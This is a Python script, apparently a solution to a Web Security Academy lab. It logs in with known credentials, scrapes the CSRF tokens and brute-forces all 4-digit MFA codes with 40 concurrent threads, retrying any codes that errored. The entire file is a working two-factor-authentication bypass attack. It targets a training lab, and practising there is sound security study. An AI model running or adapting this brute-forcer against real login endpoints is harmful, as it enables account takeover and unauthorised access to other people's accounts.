import requests
import threading

lab_id = ''
main_url = 'https://'+lab_id+'.web-security-academy.net'
errors = []
code = ''

def tryCode(x:str):
    url = main_url+"/login"
    
    s = requests.Session()
    r = s.get(url)
    csrf = str(r.content).split('csrf')[1].split('=')[1].split("\"")[1]
    
    r = s.post(main_url+"/login","csrf="+csrf+"&username=carlos&password=montoya", allow_redirects=True)
    csrf2 = str(r.content).split('csrf')[1].split('=')[1].split("\"")[1]
    output = ""
    #for i in range(2): # we can run this twice in one session ## threading + time based CSRF = errors
    #    if i == 1:
    #       x = str(int(x) + 1)
        
    setBody = "csrf="+csrf2+"&mfa-code="+str(x).zfill(4)
    r = s.post(main_url+"/login2",data=setBody)

    print(str(x).zfill(4)) 
    try:
        output = str(r.content).split('class=is-warning')[1].split('>')[1].split('<')[0]
    except:
        print("Error:"+str(x).zfill(4)) 
        errors.append(str(x).zfill(4))
    
    if output != "Incorrect security code":          
        global code 
        code = str(x).zfill(4)
    
def worker(x): 
        try:
           tryCode(str(x))
        except:
           print("Error:"+str(x).zfill(4)) 
           errors.append(str(x).zfill(4))

def chunks(l, n): #create multiple ranges based on the thread count length 
    n = max(1, n)
    return (l[i:i+n] for i in range(0, len(l), n))     

def run(mfaValues, limit):
    threads = []   

    # if thread count is 40 create (40 / mfaCodes) of ranges with 40 in each range which we will call a chunk. 
    # Example:  range(1000, 1040)
    for codes in list(chunks(mfaValues, limit)):  
       for current_code in list(codes):
          t= threading.Thread(target=worker, args=(current_code,)) # if you don't pass args with a comma at the end then the thread will pass each char in your argument as a parameter
          t.start()
          threads.append(t)
    
       for thread in threads: #stop threads for the current chunk
          thread.join()

       if code != '':
          print('MFA Code:' + code) 
          quit()

if __name__ == '__main__':

    limit = 40 # thread count
    mfaValues = range(1,9999) # all possible mfa values, but the code is most likely between 1000 and 2000
    run(mfaValues, limit)
    
    print('Errors:', errors)  # if a mfa code was not printed then the code is in the error array or I suck at programming
    mfaValues = errors 
    errors = [] # clear errors
    run(mfaValues, 10) # try codes that had an error again with less threads 

    if errors:
        print('Errors:', errors) # in case something is really wrong
    print('No MFA code found')
